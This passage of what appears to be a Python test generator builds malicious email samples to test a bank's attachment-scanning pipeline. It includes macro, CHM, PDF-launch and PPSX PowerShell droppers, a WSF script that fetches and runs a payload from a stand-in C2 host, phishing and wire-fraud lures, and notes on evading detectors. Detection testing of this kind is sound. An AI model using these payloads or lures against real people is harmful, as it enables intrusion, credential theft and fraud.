            b"Attribute VB_Name = \"ThisWorkbook\"\r\n"
            b"Private Sub Workbook_Open()\r\n"
            b"  Dim s As String\r\n"
            b"  s = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114)\r\n"
            b"  s = s & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)\r\n"
            b"  Dim c As String\r\n"
            b"  c = Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)\r\n"
            b"  Dim x As Object\r\n"
            b"  Set x = CreateObject(\"WScript.\" & c)\r\n"
            b"  x.Run s & \" -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=\"\r\n"
            b"End Sub\r\n"
        )
        vba_bin += obf_macro
        vba_bin += b"\x00" * (4096 - len(vba_bin) % 4096)
        zf.writestr("xl/vbaProject.bin", vba_bin)
    return buf.getvalue()


def _ics_calendar_phishing() -> bytes:
    """ICS calendar invite with phishing URL — social engineering via calendar.

    Evasion: ICS files aren't analyzed by any extraction tool. No YARA rule
    targets calendar format. The phishing link is in a DESCRIPTION field.
    Calendar invites auto-add to Outlook/Gmail — extremely effective vector.
    """
    return (
        b"BEGIN:VCALENDAR\r\n"
        b"VERSION:2.0\r\n"
        b"PRODID:-//Attijari Bank//Security//FR\r\n"
        b"METHOD:REQUEST\r\n"
        b"BEGIN:VEVENT\r\n"
        b"DTSTART:20240715T090000Z\r\n"
        b"DTEND:20240715T093000Z\r\n"
        b"SUMMARY:URGENT: Mandatory Security Verification\r\n"
        b"DESCRIPTION:Your account requires immediate verification.\\n"
        b"Click the link below to verify your identity:\\n\\n"
        b"https://attijari-verify.evil.test/calendar-auth?emp=target\\n\\n"
        b"Failure to verify within 24 hours will result in account suspension.\\n"
        b"This is an automated security notification.\r\n"
        b"ORGANIZER:mailto:security-noreply@attijaribank.com.tn\r\n"
        b"ATTENDEE;RSVP=TRUE:mailto:target@attijaribank.com.tn\r\n"
        b"LOCATION:https://attijari-verify.evil.test/calendar-auth\r\n"
        b"STATUS:CONFIRMED\r\n"
        b"PRIORITY:1\r\n"
        b"END:VEVENT\r\n"
        b"END:VCALENDAR\r\n"
    )


def _spoofed_reply_chain_body() -> str:
    """Email body with fake forwarded/reply chain to build trust.

    Evasion: auth passes (legitimate sending server), no attachments,
    no urgency+targeting combo. The social engineering is in the fake
    conversation history that makes the request seem pre-authorized.
    """
    return (
        "Hi Mohamed,\n\n"
        "As discussed with Aziz, please process the attached wire transfer.\n"
        "The new supplier bank details are below.\n\n"
        "IBAN: DE89 3704 0044 0532 0130 00\n"
        "BIC: COBADEFFXXX\n"
        "Amount: 28,500 EUR\n"
        "Reference: SUP-2024-Q2-FINAL\n\n"
        "Merci,\nSarah\n\n"
        "---------- Forwarded message ----------\n"
        "From: Aziz Benmoussa <aziz.benmoussa@attijaribank.com.tn>\n"
        "Date: Mon, Jul 8, 2024 at 3:42 PM\n"
        "Subject: Re: Supplier Payment - Q2\n"
        "To: Sarah Dumont <s.dumont@supplier-legit.com>\n\n"
        "Sarah,\n\nYes, please send the updated banking details to Mohamed.\n"
        "He will process the payment this week.\n\nCordialement,\nAziz\n\n"
        "---------- Original message ----------\n"
        "From: Sarah Dumont <s.dumont@supplier-legit.com>\n"
        "Date: Mon, Jul 8, 2024 at 2:15 PM\n"
        "Subject: Supplier Payment - Q2\n\n"
        "Bonjour Aziz,\n\nOur banking details have changed for the new quarter.\n"
        "Should I send the new IBAN directly to your finance team?\n\nSarah"
    )


def _zero_width_obfuscated_body() -> str:
    """Email body with zero-width Unicode characters breaking keyword detection.

    Evasion: inserts zero-width spaces (U+200B) and zero-width joiners (U+200D)
    between characters of trigger words. "password" becomes "p\u200bass\u200bword".
    Rules engine string matching won't find "password" or "verify your account".
    """
    zwsp = "\u200b"
    zwj = "\u200d"
    return (
        f"Dear customer,\n\n"
        f"We detected un{zwsp}authorized ac{zwj}cess to your account.\n"
        f"Your ac{zwsp}count will be sus{zwj}pended within 24 hours.\n\n"
        f"Please ver{zwsp}ify your iden{zwj}tity immediately:\n"
        f"https://attijari-sec{zwsp}ure.evil.test/ver{zwj}ify\n\n"
        f"Enter your pass{zwsp}word and con{zwj}firm your cre{zwsp}dentials.\n\n"
        f"Fail{zwsp}ure to res{zwj}pond will result in permanent closure.\n\n"
        f"IT Sec{zwsp}urity Team\n"
        f"Attijari Bank"
    )


def _homoglyph_domain_body() -> str:
    """Email body using Cyrillic/Greek homoglyphs in domain names.

    Evasion: "attijaribank.com" uses Latin letters but the phishing URL
    uses Cyrillic а (U+0430), е (U+0435), о (U+043E) — visually identical
    but different Unicode codepoints. Domain comparison won't match.
    """
    # Mix Cyrillic lookalikes: а=\u0430, е=\u0435, о=\u043E, с=\u0441
    fake_domain = "\u0430ttij\u0430rib\u0430nk.\u0441\u043Em.tn"
    return (
        "Cher client,\n\n"
        "Votre session bancaire a expire. Pour des raisons de securite,\n"
        "veuillez vous reconnecter immediatement.\n\n"
        f"https://{fake_domain}/secure/login\n\n"
        "Si vous ne vous reconnectez pas dans les 12 heures,\n"
        "votre acces sera temporairement suspendu.\n\n"
        "Service Clientele\n"
        "Attijari Bank"
    )


def _chm_help_file() -> bytes:
    """Compiled HTML Help (.chm) file with embedded script.

    Evasion: CHM files contain compressed HTML that runs with local
    privileges via hh.exe. No dedicated CHM parser in the pipeline.
    python-magic identifies as application/x-chm. Contains ActiveX.
    """
    # CHM file magic (ITSF — Info-Tech Storage Format)
    chm = b"ITSF\x03\x00\x00\x00"  # signature + version
    chm += struct.pack("<I", 0x60)  # header length
    chm += b"\x01\x00\x00\x00"  # unknown
    chm += struct.pack("<I", 0x1000)  # timestamp
    chm += struct.pack("<I", 0x0409)  # language (English)
    chm += b"\x00" * (0x60 - len(chm))
    # Embed HTML with ActiveX and PowerShell
    html_payload = (
        b"<html><head><title>Help</title></head><body>"
        b"<h1>Security Policy Guide</h1>"
        b"<object classid='clsid:52a2aaae-085d-4187-97ea-8c30db990436' "
        b"width='1' height='1' id='shortcut'>"
        b"<param name='Command' value='ShortCut'>"
        b"<param name='Item1' value=',cmd.exe,/c powershell -nop -w hidden "
        b"-enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA='>"
        b"</object>"
        b"<script>shortcut.Click();</script>"
        b"</body></html>"
    )
    chm += html_payload
    chm += b"\x00" * (8192 - len(chm))
    return chm


def _ppsx_autoplay() -> bytes:
    """PowerPoint Show (.ppsx) with auto-play OLE action.

    Evasion: PPSX auto-opens in slideshow mode (no edit warning).
    The OLE action triggers on slide transition. oletools may not
    flag it if it only looks for VBA in Workbook_Open patterns.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/ppt/presentation.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml"/>'
            '</Types>'
        ))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="ppt/presentation.xml"/>'
            '</Relationships>'
        ))
        # Slide with OLE action on click — runs cmd.exe
        zf.writestr("ppt/presentation.xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
            '<p:sldIdLst><p:sldId id="256" r:id="rId2"/></p:sldIdLst>'
            '</p:presentation>'
        ))
        zf.writestr("ppt/_rels/presentation.xml.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" '
            'Target="slides/slide1.xml"/>'
            '<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
            'Target="../embeddings/oleObject1.bin"/>'
            '</Relationships>'
        ))
        zf.writestr("ppt/slides/slide1.xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
            'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" '
            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
            '<p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr>'
            '<p:grpSpPr/>'
            '<p:sp><p:nvSpPr><p:cNvPr id="2" name="Action"/><p:cNvSpPr/><p:nvPr>'
            '<p:custDataLst><p:tags r:id="rId3"/></p:custDataLst>'
            '</p:nvPr></p:nvSpPr><p:spPr/>'
            '<p:txBody><a:bodyPr/><a:p><a:r><a:t>Click to view presentation</a:t></a:r></a:p></p:txBody>'
            '</p:sp></p:spTree></p:cSld>'
            '<p:transition><p:sndAc><p:stSnd><p:snd r:embed="rId3"/></p:stSnd></p:sndAc></p:transition>'
            '</p:sld>'
        ))
        # Embedded OLE object with PE payload
        ole_bin = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 50
        ole_bin += b"cmd.exe /c powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAA="
        ole_bin += b"\x00" * (4096 - len(ole_bin))
        zf.writestr("ppt/embeddings/oleObject1.bin", ole_bin)
    return buf.getvalue()


def _nested_zip_payload() -> bytes:
    """ZIP inside ZIP inside ZIP — each layer has innocent names.

    Evasion: pipeline extracts one level of ZIP. The actual payload
    is buried 3 levels deep. Each layer looks like a normal archive.
    """
    # Inner layer: the actual malicious executable
    pe = _pe_disguised_as_pdf()
    buf3 = io.BytesIO()
    with zipfile.ZipFile(buf3, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("invoice_details.exe", pe)
        zf.writestr("readme.txt", "Open invoice_details to view your invoice.")
    # Middle layer
    buf2 = io.BytesIO()
    with zipfile.ZipFile(buf2, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("documents/invoice.zip", buf3.getvalue())
        zf.writestr("documents/cover_letter.txt", "Please see the attached invoice archive.")
    # Outer layer
    buf1 = io.BytesIO()
    with zipfile.ZipFile(buf1, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("Q2_Deliverables.zip", buf2.getvalue())
        zf.writestr("index.txt", "Q2 deliverables package — see archive inside.")
    return buf1.getvalue()


def _vhd_virtual_disk() -> bytes:
    """VHD virtual disk image with embedded payload.

    Evasion: VHD files auto-mount on Windows 10+, bypassing Mark-of-the-Web.
    No VHD parser in the pipeline. python-magic may not recognize the format.
    Contains a PE payload inside the VHD structure.
    """
    # VHD footer (512 bytes at end of file) — "conectix" magic
    footer = b"conectix"  # creator application
    footer += struct.pack(">I", 0x00000002)  # features
    footer += struct.pack(">I", 0x00010000)  # file format version
    footer += struct.pack(">Q", 0xFFFFFFFFFFFFFFFF)  # data offset (fixed disk)
    footer += struct.pack(">I", int(time.time()))  # timestamp
    footer += b"win " * 1  # creator application
    footer += struct.pack(">I", 0x000A0000)  # creator version
    footer += b"Wi2k"  # creator host OS
    footer += struct.pack(">Q", 10 * 1024 * 1024)  # original size (10MB)
    footer += struct.pack(">Q", 10 * 1024 * 1024)  # current size
    # Disk geometry
    footer += struct.pack(">HBB", 20, 16, 63)  # CHS
    footer += struct.pack(">I", 2)  # disk type: fixed
    footer += b"\x00" * (512 - len(footer))
    # Payload area — PE hidden in "disk content"
    pe = _pe_disguised_as_pdf()
    disk_content = b"\x00" * 512  # boot sector
    disk_content += pe  # embedded PE
    disk_content += b"\x00" * (8192 - len(disk_content))
    return disk_content + footer


def _base64_powershell_txt() -> bytes:
    """Plain text file with base64-encoded PowerShell dropper.

    Evasion: .txt files are "safe" — no extension block, no type mismatch.
    The payload is instructions to paste into PowerShell. Tests whether
    YARA suspicious_powershell rule catches PowerShell keywords in .txt.
    """
    return (
        b"=== IT Support Instructions ===\r\n\r\n"
        b"Dear colleague,\r\n\r\n"
        b"To resolve the VPN connectivity issue, please follow these steps:\r\n\r\n"
        b"1. Press Win+R and type 'powershell' then press Enter\r\n"
        b"2. Copy and paste the following command:\r\n\r\n"
        b"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden "
        b"-EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0"
        b"ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsA"
        b"IABJAEUAWAAoACQAYwBsAGkAZQBuAHQALgBEAG8AdwBuAGwAbwBhAGQA"
        b"UwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwALgB0AGUAcwB0"
        b"AC8AcwB0AGEAZwBlADIAJwApACkA\r\n\r\n"
        b"3. The VPN fix will be applied automatically.\r\n\r\n"
        b"Note: You may see a brief command window - this is normal.\r\n\r\n"
        b"Regards,\r\n"
        b"IT Support Team\r\n"
        b"Ext: 4521\r\n"
    )


def _wsf_script() -> bytes:
    """Windows Script File (.wsf) — XML-based script container.

    Evasion: .wsf not in BLOCKED_EXTENSIONS (only .vbs and .js are).
    Contains JScript that downloads and executes a payload.
    WSF files run via wscript.exe with full privileges.
    """
    return (
        b'<?xml version="1.0" encoding="UTF-8"?>\r\n'
        b'<job id="update">\r\n'
        b'<script language="JScript">\r\n'
        b'// Security Update Installer v3.2\r\n'
        b'var wsh = new ActiveXObject("WScript.Shell");\r\n'
        b'var xhr = new ActiveXObject("MSXML2.XMLHTTP");\r\n'
        b'xhr.open("GET", "http://mal-c2.evil.test/stage2.ps1", false);\r\n'
        b'xhr.send();\r\n'
        b'var fso = new ActiveXObject("Scripting.FileSystemObject");\r\n'
        b'var tmp = fso.GetSpecialFolder(2) + "\\\\update.ps1";\r\n'
        b'var f = fso.CreateTextFile(tmp, true);\r\n'
        b'f.Write(xhr.responseText);\r\n'
        b'f.Close();\r\n'
        b'wsh.Run("powershell -ep bypass -f " + tmp, 0, false);\r\n'
        b'</script>\r\n'
        b'</job>\r\n'
    )


def _cpl_control_panel() -> bytes:
    """Control Panel file (.cpl) — actually a renamed DLL.

    Evasion: .cpl not in BLOCKED_EXTENSIONS. Executes via control.exe
    or double-click. python-magic sees it as PE/DLL (type mismatch
    with declared MIME won't trigger unless we declare non-PE type).
    """
    return _xll_excel_addin()  # Same PE/DLL structure, different extension


def _pdf_embedded_file_launch() -> bytes:
    """PDF with /EmbeddedFile and /Launch action — no JavaScript.

    Evasion: pdfid checks /JS and /JavaScript, but /Launch with an
    embedded file is a different code path. The PDF "launches" an
    embedded executable when opened. Tests /Launch detection specifically.
    """
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /Names 4 0 R\n"
        b"   /OpenAction << /S /Launch /Win << /F (cmd.exe) "
        b"/P (/c start /b powershell -nop -enc JABZ) >> >> >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        b"4 0 obj\n<< /Type /Names /EmbeddedFiles\n"
        b"   << /Names [(update.exe) 5 0 R] >> >>\nendobj\n"
        b"5 0 obj\n<< /Type /Filespec /F (update.exe)\n"
        b"   /EF << /F 6 0 R >> >>\nendobj\n"
        b"6 0 obj\n<< /Type /EmbeddedFile /Subtype /application#2Fx-msdownload\n"
        b"   /Length 42 >>\nstream\n"
        b"MZ" + b"\x90" * 40 + b"\n"
        b"endstream\nendobj\n"
        b"xref\n0 7\ntrailer\n<< /Size 7 /Root 1 0 R >>\n"
        b"startxref\n0\n%%EOF\n"
    )


def _email_thread_hijack_body() -> str:
    """Legitimate-looking thread hijack — replies to a real conversation.

    Evasion: passes auth (legitimate server), has proper reply headers,
    body references real internal context. The malicious payload is
    a "shared document" link that looks like internal SharePoint.
    No urgency phrases, no credential requests — pure social engineering.
    """
    return (
        "Bonjour Mohamed,\n\n"
        "Suite a notre reunion de ce matin, voici le document mis a jour\n"
        "avec les modifications demandees par Aziz.\n\n"
        "Lien SharePoint: https://attijaribank-my.sharepoint.evil.test/personal/"
        "docs/Q2_Budget_Final_v3.xlsx\n\n"
        "J'ai aussi ajoute les previsions pour Q3 comme discute.\n"
        "N'hesite pas si tu as des questions.\n\n"
        "Cordialement,\n"
        "Marie - Departement Finance"
    )


def _polyglot_pdf_exe() -> bytes:
    """File that is valid as both PDF and PE executable.

    Evasion: starts with %PDF (passes PDF checks) but also contains
    valid MZ header at an offset. Different from polyglot_PDF_JAR.
    Tests whether the pipeline checks for PE signatures inside PDFs.
    """
    pdf_header = (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
    )
    # Embed PE at offset > 512 bytes
    padding = b" " * (512 - len(pdf_header))
    pe = _pe_disguised_as_pdf()
    trailer = (
        b"\nxref\n0 3\ntrailer\n<< /Size 3 /Root 1 0 R >>\n"
        b"startxref\n0\n%%EOF\n"
    )
    return pdf_header + padding + pe + trailer


def _polyglot_pdf_ole() -> bytes:
    """OLE compound document that also has PDF content.

    Evasion: starts with OLE magic (D0CF11E0) so magic sees it as
    msword, but PDF content is embedded inside. Tests polyglot_file
    YARA rule for OLE + other format detection.
    """
    ole_header = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
    ole_header += b"\x00" * (512 - len(ole_header))
    # Embed PDF content in "sector"
    pdf_content = (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog >>\nendobj\n"
        b"%%EOF\n"
    )
    # Also embed PE deeper in
    pe_stub = b"MZ" + b"\x90" * 58 + b"This program cannot be run in DOS mode"
    return ole_header + pdf_content + b"\x00" * 200 + pe_stub + b"\x00" * 2048


def _polyglot_pdf_jar() -> bytes:
    """File that is simultaneously valid as both PDF and JAR (ZIP).

    Starts with PDF header but contains a ZIP/JAR structure appended.
    Bypasses filters that only check the beginning of the file.
    """
    # PDF header
    pdf_part = (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
    )
    # JAR (ZIP) appended at the end — ZIP reads from end-of-file
    jar_buf = io.BytesIO()
    with zipfile.ZipFile(jar_buf, "w") as zf:
        zf.writestr("META-INF/MANIFEST.MF", "Main-Class: Exploit\n")
        zf.writestr("Exploit.class",
                     b"\xca\xfe\xba\xbe"  # Java class magic
                     b"\x00\x00\x00\x34"  # Java 8
                     + b"\x00" * 200)
    return pdf_part + jar_buf.getvalue()


# ======================== TEST CASE DEFINITIONS ========================

def build_malicious_cases() -> list[dict]:
    """Generate all malicious test cases with ground truth labels."""
    cases = []

    # --- 1. OLE document with VBA macros ---
    cases.append({
        "name": "OLE_VBA_macro_doc",
        "description": "Word document with AutoOpen VBA macro (PowerShell dropper)",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="accounting@supplier-payments.com",
            to_addr="test@test.com",
            subject="Re: Invoice #INV-2024-0847 - Payment Processing",
            body=(
                "Dear colleague,\n\n"
                "Please find attached the updated invoice for Q2 services.\n"
                "Let me know if you have questions.\n\n"
                "Kind regards,\nSarah Mitchell\nAccounting Department"
            ),
            attachments=[("Invoice_Q2_Final.doc", _ole_vba_document(), "application/msword")],
        ),
    })

    # --- 2. PDF with embedded JavaScript ---
    cases.append({
        "name": "PDF_javascript_launch",
        "description": "PDF with /JavaScript, /OpenAction, and /Launch — C2 callback",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="notifications@secure-banking-portal.com",
            to_addr="test@test.com",
            subject="Your Monthly Statement is Ready",
            body=(
                "Your latest bank statement is now available.\n"
                "Please review the attached document for your records.\n\n"
                "Regards,\nCustomer Service"
            ),
            attachments=[("Statement_June2024.pdf", _pdf_with_js(), "application/pdf")],
        ),
    })

    # --- 3. PE executable disguised as PDF (type mismatch) ---
    cases.append({
        "name": "PE_as_PDF_type_mismatch",
        "description": "MZ executable with .pdf extension — magic bytes vs extension mismatch",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="hr@company-benefits.com",
            to_addr="test@test.com",
            subject="Updated Benefits Package - Action Required",
            body=(
                "Hi,\n\n"
                "The updated benefits package for 2024 is attached.\n"
                "Please review and sign by end of week.\n\n"
                "HR Team"
            ),
            attachments=[("Benefits_2024.pdf", _pe_disguised_as_pdf(), "application/pdf")],
        ),
    })

    # --- 4. Encrypted ZIP with password in body ---
    zip_data, zip_body = _password_zip_with_body_password()
    cases.append({
        "name": "encrypted_zip_password_in_body",
        "description": "Password-protected ZIP + password in email body (CLAUDE.md rule 8)",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="finance@trusted-vendor.com",
            to_addr="test@test.com",
            subject="Protected Invoice - Confidential",
            body=zip_body,
            attachments=[("invoice_protected.zip", zip_data, "application/zip")],
        ),
    })

    # --- 5. OOXML with remote template injection ---
    cases.append({
        "name": "OOXML_remote_template",
        "description": "DOCX with external .dotm template URL (template injection)",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="reports@quarterly-review.com",
            to_addr="test@test.com",
            subject="Q2 Financial Report - Board Review",
            body=(
                "Attached is the Q2 financial report for the board meeting.\n"
                "Please review ahead of Thursday's session.\n\n"
                "Best,\nFinance Team"
            ),
            attachments=[("Q2_Report_2024.docx", _ooxml_remote_template(),
                         "application/vnd.openxmlformats-officedocument.wordprocessingml.document")],
        ),
    })

    # --- 6. HTML smuggling ---
    cases.append({
        "name": "HTML_smuggling",
        "description": "HTML file with base64 PE payload + JavaScript auto-download",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="support@document-cloud-service.com",
            to_addr="test@test.com",
            subject="Shared Document: Project Proposal",
            body=(
                "A document has been shared with you.\n"
                "Open the attached HTML file in your browser to view it.\n\n"
                "Document Cloud Service"
            ),
            attachments=[("view_document.html", _html_smuggling_attachment(), "text/html")],
        ),
    })

    # --- 7. SVG with XSS script ---
    cases.append({
        "name": "SVG_embedded_script",
        "description": "SVG image with JavaScript cookie exfiltration",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="analytics@dashboard-reports.com",
            to_addr="test@test.com",
            subject="Weekly Performance Chart",
            body=(
                "Hi team,\n\n"
                "Attached is this week's performance chart.\n\n"
                "Analytics Team"
            ),
            attachments=[("performance_chart.svg", _svg_with_script(), "image/svg+xml")],
        ),
    })

    # --- 8. ISO image with LNK payload ---
    cases.append({
        "name": "ISO_with_LNK_payload",
        "description": "ISO container with embedded LNK shortcut running PowerShell",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="it-support@internal-tools.com",
            to_addr="test@test.com",
            subject="Software Update Package",
            body=(
                "Please install the latest security update from the attached package.\n\n"
                "IT Support"
            ),
            attachments=[("SecurityUpdate_2024.iso", _iso_image_with_lnk(),
                         "application/x-iso9660-image")],
        ),
    })

    # --- 9. Polyglot PDF/JAR ---
    cases.append({
        "name": "polyglot_PDF_JAR",
        "description": "File valid as both PDF and Java JAR — bypasses extension-based filters",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="research@academic-journal.org",
            to_addr="test@test.com",
            subject="Peer Review: Submission #4821",
            body=(
                "Dear reviewer,\n\n"
                "Please find the manuscript attached for your review.\n"
                "The review deadline is July 15.\n\n"
                "Editorial Office"
            ),
            attachments=[("manuscript_4821.pdf", _polyglot_pdf_jar(), "application/pdf")],
        ),
    })

    # --- 10. Spear phishing with DMARC failure + urgency + credential harvesting ---
    cases.append({
        "name": "spear_phish_credential_harvest",
        "description": "Fake IT alert with auth failure + credential harvesting link",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="it-security@attijaribenk.com.tn",  # typosquat
            to_addr="test@test.com",
            subject="URGENT: Your Account Will Be Suspended",
            body=(
                "Dear user,\n\n"
                "We detected unauthorized access to your account. "
                "Your account will be suspended within 24 hours unless you "
                "verify your identity immediately.\n\n"
                "Click here to confirm your password: "
                "http://attijari-secure-verify.com/login\n\n"
                "Failure to respond will result in permanent account closure.\n\n"
                "IT Security Team\nAttijari Bank"
            ),
            auth_pass=False,
        ),
    })

    # --- 11. BEC / CEO fraud ---
    cases.append({
        "name": "CEO_wire_fraud",
        "description": "CEO impersonation requesting urgent wire transfer with IBAN",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="ceo.bureau@attijaribank-tn.com",  # look-alike domain
            to_addr="test@test.com",
            subject="Confidential - Urgent Wire Transfer",
            body=(
                "Bonjour,\n\n"
                "J'ai besoin que vous effectuiez un virement urgent "
                "pour nos operations habituelles.\n\n"
                "Montant: 45,000 EUR\n"
                "IBAN: DE89 3704 0044 0532 0130 00\n"
                "BIC: COBADEFFXXX\n\n"
                "C'est confidentiel, ne parlez a personne. "
                "Confirmez quand c'est fait.\n\n"
                "Cordialement"
            ),
            auth_pass=False,
        ),
    })

    # --- 12. Double-extension executable ---
    cases.append({
        "name": "double_extension_screensaver",
        "description": "Executable with .pdf.scr double extension",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="documents@file-share-service.com",
            to_addr="test@test.com",
            subject="Shared File: Annual Report",
            body="The requested file has been shared with you.\n\nFile Share Service",
            attachments=[("Annual_Report.pdf.scr", _double_extension_exe(),
                         "application/octet-stream")],
        ),
    })

    # ===================================================================
    # RED TEAM ATTACK VECTORS (v2) — 21 additional evasion techniques
    # ===================================================================

    # --- 13. QR code phishing — malicious URL hidden in image, not body ---
    cases.append({
        "name": "qr_code_phishing",
        "description": "PNG with phishing URL in metadata — no link in email body",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="noreply@secure-verification.com",
            to_addr="test@test.com",
            subject="Scan to Verify Your Account",
            body=(
                "Dear customer,\n\n"
                "For enhanced security, please scan the attached QR code\n"
                "with your mobile device to complete identity verification.\n\n"
                "This is a mandatory annual security check.\n\n"
                "Security Team"
            ),
            attachments=[("verification_qr.png", _qr_code_phishing_png(), "image/png")],
        ),
    })

    # --- 14. DDE exploit in .docx — no VBA macros ---
    cases.append({
        "name": "DDE_exploit_docx",
        "description": "DOCX with DDE field executing PowerShell — no macro warning",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="payroll@company-hr-portal.com",
            to_addr="test@test.com",
            subject="Updated Salary Schedule - November 2024",
            body=(
                "Hi team,\n\n"
                "The updated salary schedule is attached.\n"
                "Please review your department's allocations.\n\n"
                "Regards,\nHR Department"
            ),
            attachments=[("Salary_Schedule_Nov2024.docx", _dde_docx(),
                         "application/vnd.openxmlformats-officedocument.wordprocessingml.document")],
        ),
    })

    # --- 15. RTF with embedded OLE object ---
    cases.append({
        "name": "RTF_embedded_OLE",
        "description": "RTF document with OLE object containing PE payload (CVE-2017-11882 style)",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="procurement@vendor-invoices.com",
            to_addr="test@test.com",
            subject="Purchase Order #PO-2024-5839",
            body=(
                "Dear procurement team,\n\n"
                "Attached is the purchase order for the Q3 equipment.\n"
                "Please confirm receipt.\n\n"
                "Vendor Relations"
            ),
            attachments=[("PO_2024_5839.doc", _rtf_ole_object(), "application/msword")],
        ),
    })

    # --- 16. OneNote with embedded executable ---
    cases.append({
        "name": "OneNote_embedded_payload",
        "description": "OneNote .one file with embedded HTA payload — no dedicated parser",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="training@corporate-learning.com",
            to_addr="test@test.com",
            subject="New Training Module: Cybersecurity Awareness",
            body=(
                "Hi,\n\n"
                "Please open the attached OneNote notebook for the\n"
                "mandatory cybersecurity awareness training module.\n\n"
                "Corporate Training"
            ),
            attachments=[("CyberSecurity_Training.one", _onenote_embedded_payload(),
                         "application/onenote")],
        ),
    })

    # --- 17. ZIP bomb — extraction timeout attack ---
    cases.append({
        "name": "zip_bomb_timeout",
        "description": "Nested ZIP bomb to trigger extraction timeout — fail-safe test",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="archive@data-delivery.com",
            to_addr="test@test.com",
            subject="Data Export - Your Requested Files",
            body=(
                "Your requested data export is ready.\n"
                "See attached archive.\n\n"
                "Data Services"
            ),
            attachments=[("data_export_2024.zip", _zip_bomb(), "application/zip")],
        ),
    })

    # --- 18. Steganography PNG — payload in pixel LSBs ---
    cases.append({
        "name": "steganography_payload",
        "description": "PNG with PowerShell payload hidden in pixel LSBs + suspicious metadata",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="marketing@brand-assets.com",
            to_addr="test@test.com",
            subject="Updated Brand Logo for Q3 Campaign",
            body=(
                "Hi,\n\n"
                "Here's the updated logo for the Q3 marketing campaign.\n"
                "Please use this version going forward.\n\n"
                "Brand Team"
            ),
            attachments=[("brand_logo_q3.png", _steganography_png(), "image/png")],
        ),
    })

    # --- 19. Standalone .lnk shortcut — not inside ISO ---
    cases.append({
        "name": "standalone_LNK_shortcut",
        "description": "Bare .lnk file executing PowerShell — evades ISO-dependent YARA rule",
        "expected": "malicious",
        "eml": _make_eml(
            from_addr="it-helpdesk@internal-support.com",
            to_addr="test@test.com",
            subject="VPN Fix - Run This Shortcut",
            body=(
                "Hi,\n\n"
                "We've identified the VPN issue on your machine.\n"
